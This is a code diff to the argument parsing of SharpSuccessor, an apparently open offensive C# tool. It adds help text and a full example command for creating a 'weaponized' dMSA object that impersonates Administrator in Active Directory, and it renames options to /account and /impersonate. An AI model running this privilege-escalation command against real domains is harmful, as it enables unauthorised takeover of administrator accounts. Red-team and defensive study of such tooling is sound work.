@@ -9,7 +9,9 @@ namespace SharpSuccessor.Modules
     {
         public static void Help()
         {
-            string help = "";
+            string help =
+                "[*] Create and weaponize a dMSA object, setting the target for impersonation, path of the vulnerable OU, account to access to weaponized dMSA, and the name of the dMSA object:\n" +
+                "\tSharpSuccessor.exe add /impersonate:Administrator /path:\"ou=test,dc=lab,dc=lan\" /account:jdoe /name:attacker_dMSA\r\n";
             Console.WriteLine(help);
         }
 
@@ -70,7 +72,7 @@ namespace SharpSuccessor.Modules
                         case "add":
                             if (args.Length > 1)
                             {
-                                string computer = null;
+                                string access = null;
                                 string target = null;
                                 string path = null;
                                 string dMSAName = null; 
@@ -81,18 +83,18 @@ namespace SharpSuccessor.Modules
                                     return;
                                 }
 
-                                cmd.TryGetValue("/computer", out computer);
-                                cmd.TryGetValue("/target", out target);
+                                cmd.TryGetValue("/account", out access);
+                                cmd.TryGetValue("/impersonate", out target);
                                 cmd.TryGetValue("/path", out path);
                                 cmd.TryGetValue("/name", out dMSAName);
 
-                                if(computer == null || target == null || path ==null || dMSAName == null)
+                                if(access == null || target == null || path ==null || dMSAName == null)
                                 {
-                                    Console.WriteLine("[!] Missing required arguments: computer,target,path,name");
+                                    Console.WriteLine("[!] Missing required arguments: account,impersonate,path,name\n[!] See help menu for more information.");
                                     return;
                                 }
 
-                                dMSA.CreatedMSA(path, dMSAName, computer, target);
+                                dMSA.CreatedMSA(path, dMSAName, access, target);
 
 
                             }
